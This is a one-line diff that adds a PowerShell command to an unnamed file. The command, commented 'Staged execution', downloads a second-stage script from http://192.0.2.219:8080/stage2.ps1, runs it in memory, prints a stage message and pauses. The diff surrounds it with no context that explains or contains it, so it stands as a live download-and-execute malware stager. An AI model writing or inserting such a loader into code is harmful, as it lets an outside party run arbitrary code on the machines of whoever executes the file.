@@ -1,0 +1,1 @@
+<# Staged execution #> $DownloadedScript = (iwr 'http://192.0.2.219:8080/stage2.ps1' -UseBasicParsing).Content; [ScriptBlock]::Create($DownloadedScript).Invoke(); Write-Output "stage 16 initialized"; Start-Sleep -Seconds 15
